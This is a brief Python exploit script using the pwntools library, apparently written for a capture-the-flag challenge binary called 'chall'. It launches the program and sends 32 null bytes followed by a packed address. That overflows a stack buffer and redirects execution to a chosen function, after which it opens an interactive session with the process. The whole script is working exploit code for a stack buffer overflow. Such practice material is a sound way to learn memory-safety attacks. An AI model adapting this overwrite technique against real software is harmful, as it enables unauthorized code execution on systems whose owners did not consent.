from pwn import *
#libc=ELF('/lib/x86_64-linux-gun/libc-2.23.so')
#log.warning(hex(base))
context.log_level='debug'
p=process('./chall')
aim=0x00000000040075E
p.sendlineafter("ap!\n","\x00"*0x20+p64(aim))
#gdb.attach(p,'')
p.interactive()
